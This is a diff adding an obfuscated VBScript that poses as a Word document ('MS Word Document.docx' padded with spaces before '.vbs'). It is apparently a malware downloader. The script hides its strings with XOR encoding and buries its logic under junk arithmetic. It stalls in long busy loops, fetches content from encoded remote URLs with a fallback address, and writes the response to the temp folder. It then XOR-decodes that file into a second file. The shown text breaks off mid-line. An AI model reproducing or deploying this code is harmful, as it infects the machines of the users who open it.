@@ -1,0 +1,416 @@
+,(   MS Word Document.docx                              .vbs C:\Users\Test7\Desktop\1\MS Word Document.docx                              .vbs    Z   C:\Users\Test7\AppData\Local\Temp\MS Word Document.docx                              .vbs o%  DiM L4
+fUnctiOn QN7(XKdOd2JA)
+BqIVfW="92"-"36"
+XFV0n4x="5"+"25"+"37"+"29"
+DUTQ6ti=BqIVfW+XFV0n4x
+sET QN7=CreaTeoBjeCT(XKdOd2JA)
+Kbg="61"-"62"
+RGvaau="59"+"68"+"40"+"26"
+Kb0xC=Kbg+RGvaau
+EnD FUnCTIOn
+FuNCtIOn QxRB()
+LFrl="77"-"86"
+LxHnk="13"+"7"+"73"+"48"
+Cp=LFrl+LxHnk
+QxRB=secoND(tIMe)
+Iz="64"-"25"
+YYBR="71"+"6"+"29"+"6"
+NWMv6OgJ=Iz+YYBR
+enD funCTioN
+sUb WTh8P(NIcXYuS)
+U5Q="43"-"71"
+FYrKzCd="12"+"15"+"33"+"52"
+UR1p=U5Q+FYrKzCd
+dIM Xr8l
+UQuVkHc="30"-"34"
+MCfc="96"+"35"+"46"+"61"
+Y8Y=UQuVkHc+MCfc
+Xr8l=TimER+NIcXYuS
+G7txE1wm="5"-"17"
+JvxV="54"+"69"+"49"+"10"
+NWK4We=G7txE1wm+JvxV
+dO wHiLE timER<Xr8l
+LOOp
+IQZ="24"-"38"
+I4yRsmTN="96"+"48"+"20"+"51"
+QPbYndc=IQZ+I4yRsmTN
+EnD sUB
+fUNcTIon JCf(TdFe)
+RCnQD="97"-"24"
+Q4="98"+"72"+"25"+"68"
+ReG1Ao=RCnQD+Q4
+JCf = Len(TdFe)
+TA="55"-"4"
+L5C42q="5"+"57"+"73"+"97"
+Eni4=TA+L5C42q
+EnD fUncTion
+FUnCTiOn UG0z4b(QiYaL)
+AKx="93"-"95"
+Mn="37"+"39"+"57"+"4"
+ICbS=AKx+Mn
+UG0z4b=aSC(QiYaL)
+MyGa="68"-"71"
+Wm6A="89"+"9"+"98"+"55"
+QH3BZZ=MyGa+Wm6A
+EnD fUNCtion
+FUNction SRToxoH(G2OS)
+Bf="54"-"67"
+ACA="81"+"39"+"64"+"63"
+V0=Bf+ACA
+SRToxoH=cHR(G2OS)
+Gu="3"-"81"
+KKKScgCA="43"+"34"+"35"+"32"
+Paxkmw=Gu+KKKScgCA
+ENd funCtION
+sUb I0w(TT)
+QZs="67"-"94"
+QE8fDJI="58"+"92"+"65"+"73"
+WmLx=QZs+QE8fDJI
+DiM M3x3Bki
+Fo="31"-"81"
+UxXBnH3="32"+"53"+"41"+"76"
+LuP4=Fo+UxXBnH3
+SxyGLQ="U0Tg9"
+GC51KGJG="84"-"22"
+VpWEpECj="82"+"28"+"63"+"13"
+VvNt42bj=GC51KGJG+VpWEpECj
+sEt M3x3Bki=QN7(Y9Ocx6cw("7110287D171E07134B305139",SxyGLQ))
+IX="78"-"71"
+LVtcD="93"+"26"+"28"+"69"
+QWdJ9A=IX+LVtcD
+M3x3Bki.OPen
+Uzde="36"-"78"
+QB8p4U="26"+"37"+"29"+"52"
+N3ykZdwu=Uzde+QB8p4U
+M3x3Bki.TYpe=3295-3294
+EoY3ZSBl="46"-"49"
+WaJAz7="12"+"51"+"61"+"76"
+JKUtC=EoY3ZSBl+WaJAz7
+M3x3Bki.WRite TT
+AtR="75"-"66"
+ML1dV="67"+"64"+"73"+"45"
+XuzcLo57=AtR+ML1dV
+M3x3Bki.SavETOfILE L4 & Y9Ocx6cw("6D104126","UCB0e"),9812-9810
+QsT2F="35"-"86"
+GgYl="59"+"89"+"96"+"3"
+I4fHwNv8=QsT2F+GgYl
+M3x3Bki.Close
+PzeIxr="92"-"22"
+EX="8"+"77"+"42"+"47"
+RYPJ9Avt=PzeIxr+EX
+Iw8Z
+Kh="80"-"65"
+EhrM="35"+"1"+"5"+"44"
+GdcF=Kh+EhrM
+eND suB
+FUNCTIOn VFvB(Jkvf0,NRZ,UNEjzC)
+KJ6="79"-"1"
+Jwey="12"+"4"+"27"+"59"
+Kirq=KJ6+Jwey
+VFvB=Mid(Jkvf0,NRZ,UNEjzC)
+JVHqA9T="8"-"95"
+YR9i="31"+"25"+"69"+"11"
+FB=JVHqA9T+YR9i
+eNd FUNCtiON
+FunCTiON JfHfmozH(FboQ,YkAUE)
+WFER="36"-"16"
+MBlCrZ="76"+"94"+"95"+"91"
+Xvvv5=WFER+MBlCrZ
+JfHfmozH=(FboQ aND nOt YkAUE)oR(NoT FboQ ANd YkAUE)
+R80L9A="68"-"27"
+I3="23"+"88"+"66"+"6"
+WWLzoWbg=R80L9A+I3
+eNd Function
+XovyXwo="48"-"15"
+AzLK5ud="14"+"89"+"63"+"16"
+QtMWJJi0=XovyXwo+AzLK5ud
+O8kuK
+suB O8kuK()
+U9Dx="47"-"69"
+Mvz5juBL="57"+"92"+"86"+"31"
+C48AEk=U9Dx+Mvz5juBL
+Xx=92752151
+BVU="62"-"31"
+Ddy="51"+"63"+"55"+"77"
+Ip9=BVU+Ddy
+fOR GYM=1 To Xx
+Kigiwk=Kigiwk+1
+nExT
+Bw6iZ6f="98"-"29"
+Xr7unUk="91"+"4"+"40"+"56"
+Nm761s=Bw6iZ6f+Xr7unUk
+iF Kigiwk=Xx theN
+CMdoAbFA="8"-"7"
+QgoA6i="37"+"44"+"50"+"34"
+IB=CMdoAbFA+QgoA6i
+WTh8P((5699-5695))
+DPKB="39"-"38"
+Orap="69"+"76"+"81"+"65"
+KT02=DPKB+Orap
+LJvUVZS(Y9Ocx6cw("2211052869654A406066645449617D7B515F696A794A1E3C34640F15","SJeqX"))
+D4ph="9"-"10"
+Vo="7"+"16"+"87"+"1"
+Pb=D4ph+Vo
+ENd iF
+K9VYQ="59"-"66"
+XUMoC06u="71"+"55"+"4"+"59"
+BhI=K9VYQ+XUMoC06u
+eNd SuB
+FunCtiON XQU2sqi9(VTs, YtcXf2Ga)
+Kkz6L="6"-"32"
+RVmOy="7"+"80"+"33"+"76"
+Tj=Kkz6L+RVmOy
+XQU2sqi9 = VTs MoD YtcXf2Ga
+Cr="76"-"4"
+YKVpUyl="96"+"64"+"89"+"39"
+XaSFonV=Cr+YKVpUyl
+eND fUNcTiOn
+SuB LWj()
+JYVZE="80"-"72"
+U9KFKzv="95"+"28"+"30"+"71"
+K2=JYVZE+U9KFKzv
+Dim Cq2m4Mu,RRxQ
+RQbG6l9="29"-"32"
+F1VuV1="50"+"69"+"59"+"16"
+OFkn5Mp=RQbG6l9+F1VuV1
+For Cq2m4Mu = 41 To 8000162
+RRxQ = TDZzgVL + 84 + 28 + 97
+Next
+YTDIp="19"-"22"
+APyC0="40"+"85"+"75"+"32"
+IBlTd8=YTDIp+APyC0
+eND sUB
+FuncTION LJvUVZS(DSUBiXAd)
+Kom="73"-"3"
+LvTag37="88"+"58"+"24"+"28"
+RVXYp1X=Kom+LvTag37
+Dim W25DiXD8,JENQjiW,CM
+VACkJRJr="31"-"40"
+I5="66"+"60"+"27"+"52"
+NDh9CFG=VACkJRJr+I5
+WFgObe="XY8w2"
+Ii5="84"-"59"
+Qf="60"+"12"+"29"+"53"
+CnC=Ii5+Qf
+On ERrOR REsuMe nExT
+E3i1yQP="10"-"17"
+Ldmz7Oq6="67"+"44"+"39"+"28"
+OVWuIe=E3i1yQP+Ldmz7Oq6
+QWaUUe7="Nl82F3no"
+MQekN="25"-"75"
+TDH="97"+"85"+"21"+"15"
+WLl=MQekN+TDH
+SeT W25DiXD8=QN7(Y9Ocx6cw("3B6B51345A1E1B603F50572A5F",QWaUUe7))
+BEjS="53"-"34"
+OorEUn="83"+"34"+"55"+"44"
+LvHd3=BEjS+OorEUn
+StC5="UCB0e"
+LWj
+OU="13"-"51"
+RoEAOZ="11"+"57"+"91"+"15"
+FyXu6Mz=OU+RoEAOZ
+Set AP1w=W25DiXD8.EnVirONMeNT(Y9Ocx6cw("3F0A032C1D1F3C","LoX"))
+NhPgMglu="7"-"49"
+PY9bYx="96"+"8"+"1"+"23"
+AqW=NhPgMglu+PY9bYx
+L4=AP1w(Y9Ocx6cw("2B070534121E15","LjWUpSJT"))&SRToxoH((-720+812))& QxRB & QxRB
+R63="39"-"32"
+GNf4RK="54"+"86"+"16"+"56"
+DmjFp=R63+GNf4RK
+FRbgi2C="Sl23"
+RhXT="86"-"97"
+PglbGTGs="89"+"13"+"45"+"73"
+Xk=RhXT+PglbGTGs
+Set JENQjiW=QN7(Y9Ocx6cw("215B502103415C35181C6B1E207A67073C",FRbgi2C))
+EAQf="17"-"11"
+Pzf="55"+"24"+"44"+"55"
+EGHK=EAQf+Pzf
+JENQjiW.oPeN Y9Ocx6cw("130363","ITF7Zzak"),DSUBiXAd,2681-2681
+Uwehni="52"-"40"
+DZB="75"+"69"+"13"+"55"
+Tqm2Yu=Uwehni+DZB
+JENQjiW.SeND
+PYu7sps="38"-"88"
+DAf="10"+"98"+"33"+"28"
+GaOWldpj=PYu7sps+DAf
+if JENQjiW.StAtUs=(1378800/6894) then
+PF="91"-"59"
+VJvAsP6="3"+"71"+"92"+"4"
+MGn3=PF+VJvAsP6
+LWj
+FE2L="23"-"18"
+XKh="61"+"30"+"50"+"62"
+NbJB=FE2L+XKh
+WTh8P((22392/5598))
+GrNabl3="36"-"85"
+Tfz2="63"+"58"+"46"+"81"
+ALveB=GrNabl3+Tfz2
+CM = 9198
+Ye5="56"-"89"
+KNvUPKAm="63"+"70"+"21"+"71"
+OzizHm4=Ye5+KNvUPKAm
+Else
+AB0CIwM="94"-"29"
+Ik="78"+"29"+"51"+"39"
+WZ=AB0CIwM+Ik
+JENQjiW.opEn Y9Ocx6cw("240B66","VcN2r"),Y9Ocx6cw("291A2631547D6E073C2507352E1E3D2E02332F0A3D341A362E01206F0D3D2C413E2E097C310522","RAn"),2150-2150
+EJv9x6EX="54"-"9"
+CMehg="46"+"7"+"53"+"87"
+MtKF=EJv9x6EX+CMehg
+JENQjiW.SEnd
+RqIkZVh="41"-"29"
+ImAd="64"+"58"+"3"+"44"
+OWQ=RqIkZVh+ImAd
+If JENQjiW.sTaTuS=(711200/3556)TheN CM = 9198
+D6w3j="28"-"46"
+DIeN="91"+"81"+"39"+"42"
+KVnHUp1E=D6w3j+DIeN
+JNP39="55"-"66"
+Jr="59"+"81"+"14"+"42"
+NEl242=JNP39+Jr
+end if
+ORK="24"-"92"
+NKIZ="13"+"25"+"17"+"39"
+Nr5G=ORK+NKIZ
+If CM = 9198 THen
+GRtwL="82"-"24"
+KhlNLQp="71"+"82"+"75"+"97"
+IxinfF=GRtwL+KhlNLQp
+I0w JENQjiW.reSPOnsEBoDY
+G2N="49"-"29"
+PJzcDd="89"+"7"+"9"+"5"
+B39LQ=G2N+PJzcDd
+eNd If
+MlTO="91"-"8"
+LNh="87"+"48"+"39"+"40"
+Wq8=MlTO+LNh
+eNd FunCTIon
+funcTiOn Y9Ocx6cw(D8cknm,Ky)
+RgMR5="31"-"62"
+WLkygLAm="69"+"74"+"58"+"7"
+VhZ3FyJQ=RgMR5+WLkygLAm
+diM EimhG,GeYbQ,OPKs
+Xz="15"-"19"
+RzG0="58"+"14"+"22"+"49"
+VxdS=Xz+RzG0
+fOR EimhG=1 tO (JCf(D8cknm)/2)
+GeYbQ=(SRToxoH((148048/3896)) & SRToxoH((529560/7355))&(VFvB(D8cknm,(EimhG+EimhG)-1,2)))
+OPKs=(UG0z4b(VFvB(Ky,((XQU2sqi9(EimhG,JCf(Ky)))+1),1)))
+Y9Ocx6cw=Y9Ocx6cw+SRToxoH(JfHfmozH(GeYbQ,OPKs))
+nEXt
+SKm8u="1"-"67"
+SVel8aV="93"+"42"+"42"+"94"
+X4wr=SKm8u+SVel8aV
+eND FUncTiOn
+FuncTIoN Lhctq(UEH,LVtaMA)
+RZLcxYQ="61"-"91"
+OULoBwW="54"+"66"+"3"+"19"
+DPM0PKb=RZLcxYQ+OULoBwW
+dIM XY9qOIh,Vr,RDwheF,O5mb9P3N(5)
+MJw6AHB="90"-"9"
+JWD9yXy="10"+"6"+"16"+"86"
+FjTC=MJw6AHB+JWD9yXy
+O5mb9P3N(3)=99
+YnpIushY="22"-"22"
+QF4vFrkY="74"+"90"+"15"+"69"
+A2TlH2S=YnpIushY+QF4vFrkY
+O5mb9P3N(0)=115
+RcWYD5M="27"-"65"
+GXXkRU="25"+"71"+"6"+"29"
+Lew9=RcWYD5M+GXXkRU
+O5mb9P3N(1)=110
+AT5gzW="57"-"30"
+Vp="38"+"87"+"64"+"59"
+NQUImpZ=AT5gzW+Vp
+O5mb9P3N(2)=118
+AuQxjFR="13"-"67"
+Y6g0WU="31"+"65"+"38"+"45"
+IjDD=AuQxjFR+Y6g0WU
+O5mb9P3N(4)=56
+JSP6lFN="4"-"26"
+QJjvT4="14"+"49"+"17"+"61"
+QxGNvg=JSP6lFN+QJjvT4
+O5mb9P3N(5)=53
+JV18UEo="28"-"62"
+QogwKc="85"+"62"+"57"+"46"
+Vu=JV18UEo+QogwKc
+VRuBCp="93"-"43"
+EO="21"+"16"+"4"+"39"
+UD=VRuBCp+EO
+Set XY9qOIh=QN7(Y9Ocx6cw("632B140611385926014127255C2D351612385525290D0B29533C", "L0Hfoa"))
+DLAAn="73"-"37"
+VCwFCO="71"+"44"+"52"+"2"
+Uo=DLAAn+VCwFCO
+seT RDwheF=XY9qOIh.opENTextFIle(UEH,5054-5053,6976-6976)
+UPIHJXPq="45"-"48"
+KKzMN="11"+"23"+"60"+"76"
+Pmf6=UPIHJXPq+KKzMN
+Set Vr=XY9qOIh.cREATEtexTfilE(LVtaMA,34-33,1610-1610)
+Yr="69"-"54"
+VI2g="2"+"57"+"17"+"86"
+LfVUzL8=Yr+VI2g
+oN eRROR rEsuME nEXt
+ByxJC="64"-"5"
+BrQl6iw="30"+"6"+"79"+"32"
+Q09l87=ByxJC+BrQl6iw
+dO
+O8j="63"-"13"
+W75FTth="63"+"85"+"73"+"9"
+ILsrNrxy=O8j+W75FTth
+XfQP2=RDwheF.rEAd(1676-1675)
+FVeVIJ="47"-"67"
+IXG3hv="79"+"71"+"93"+"27"
+SYFtU=FVeVIJ+IXG3hv
+if ERr.nuMber = 0 then
+QB7rz="52"-"58"
+RPg="86"+"28"+"31"+"49"
+X35u1gkb=QB7rz+RPg
+Vr.wrItE SRToxoH(JfHfmozH(UG0z4b(XfQP2),O5mb9P3N(0)))
+GzCZs="26"-"16"
+Lz6aYSnM="72"+"76"+"39"+"77"
+VoL7r=GzCZs+Lz6aYSnM
+eND iF
+LOrp0et="72"-"84"
+YMRFDoQd="98"+"31"+"82"+"80"
+SF=LOrp0et+YMRFDoQd
+LoOp UNTIl Err.NUmBEr <> 0
+JFInF="91"-"58"
+JPAQTbM="58"+"33"+"7"+"59"
+Q054sq=JFInF+JPAQTbM
+Vr.CLoSE
+OkphcN2="12"-"76"
+Keptql7O="10"+"82"+"90"+"41"
+IcDLQAe3=OkphcN2+Keptql7O
+RDwheF.ClOsE
+Ss="49"-"71"
+UoVYRLx="59"+"94"+"62"+"6"
+Sm=Ss+UoVYRLx
+EnD FUNcTIoN
+SuB Iw8Z()
+IUQBp6me="68"-"20"
+O7V7x="91"+"23"+"30"+"35"
+Q7To=IUQBp6me+O7V7x
+A7B=""""
+ENJ="38"-"44"
+Gm="28"+"75"+"5"+"90"
+GMg0fVXy=ENJ+Gm
+V3x472a=L4 & QxRB & Y9Ocx6cw("45771637","Nk4UzM")
+Jc6="35"-"60"
+GBxhBsjz="58"+"89"+"96"+"2"
+Jg7fe=Jc6+GBxhBsjz
+DsqfW=Y9Ocx6cw("2C2B347F0F0B2A6F69137139270E1D12707348536D","OOFPQjs")
+JNS="18"-"65"
+MnBw35b4="22"+"80"+"76"+"42"
+VE0pNKf=JNS+MnBw35b4
+Lhctq L4 & Y9Ocx6cw("56040915","Vx"),V3x472a
+D4Zx9k="86"-"91"
+Xh="75"+"24"+"79"+"39"
+LuhJ=D4Zx9k+Xh
+iF Udnt="" Then WTh8P((13924/3481))
+Jp="12"-"96"
+BAuWbDiK="66"+"32"+"36"+"75"
+Ta4h=Jp+BAuWbDiK
+BA="KUC3"
+Y9vgo="69"-"55"
+KkjMu="25"+"89"+"94"+"34"
+PRyZlE=Y9vgo+K
